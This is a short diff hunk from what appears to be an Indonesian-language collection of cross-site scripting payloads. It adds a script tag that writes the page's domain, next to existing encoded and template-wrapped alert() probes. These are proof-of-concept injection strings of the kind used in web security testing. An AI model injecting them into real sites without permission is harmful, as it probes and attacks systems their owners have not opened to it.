@@ -5,6 +5,8 @@ TOLONG DOAKAN PENULIS DAN PEMILIK PAYLOAD YANG PENULIS DAPATKAN DARI SUMBER MANA
 SEMOGA BERKAH DAN MEMBAWA MANFAAT SELALU
 -----------------------------------------------------------------------
 
+<script>document.write(document.domain)</script>
+
 xss&lt;script&gt;alert&#40;1337&#41;&lt;&#47;script&gt
 
 {{"<script>alert(123)</script>"}}
